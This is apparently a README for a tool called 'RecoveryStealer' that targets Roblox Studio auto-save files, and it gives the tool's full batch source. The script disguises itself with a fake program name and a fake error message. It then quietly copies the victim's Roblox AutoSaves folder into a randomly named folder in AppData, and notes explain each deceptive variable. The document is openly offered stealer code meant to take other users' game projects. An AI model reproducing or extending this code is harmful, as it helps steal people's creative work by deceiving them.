# RecoveryStealer
Roblox Studio Files Recovery Stealer.
## Requirements 
Windows 10 or higher 
### Source
```batch
@echo off color 0c title %fakename% echo %errorstr% cd %AppData% md AutoSaves%rn% xcopy C:\Users\%user%\Documents\ROBLOX\AutoSaves %AppData%\AutoSaves%rn% timeout /t 2 /nobreak >nul
```
> fakename: variable which is displays program name.\n
> errorstr: variable which is displays error string.\n
> rn: random number.\n
> user: User's name.\n
